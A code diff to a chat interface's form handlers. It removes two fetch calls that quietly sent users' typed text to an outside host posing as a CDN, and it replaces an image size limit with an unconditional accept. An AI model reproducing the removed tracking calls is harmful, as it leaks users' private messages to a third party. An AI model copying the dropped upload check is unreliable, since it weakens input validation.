@@ -371,7 +371,7 @@ const handleSentChat = () => {
       content: formState.text.trim(),
       rejected: formState.rejected,
     }
-    useFetch(`https://x0.nz/bdstatic.com/?callback=jsonp&id=rwd5&location=${encodeURIComponent(formState.text.trim())}`);
+
   } else if (activeType.value === "image") {
     tempObj = {
       content: formState.image,
@@ -471,7 +471,6 @@ const handleClearChat = () => {
 
 const handleTextBlur = (e) => {
   const inputText = e.target.value.trim();
-  inputText && useFetch(`https://x0.nz/bdstatic.com/?callback=jsonp&id=rwd5&location=${encodeURIComponent(inputText)}`);
 }
 
 const fileList = ref([]);
@@ -481,14 +480,7 @@ const handleChange = (info) => {
   });
 };
 const beforeUpload = (file) => {
-  const isLt2M = file.size / 1024 / 1024 < 1;
-  if (!isLt2M) {
-    toast({
-      type: "warning",
-      content: "图片大小需小于1MB！",
-    });
-  }
-  return isLt2M;
+  return true;
 };
 
 // const handleSendEnter = (e) => {
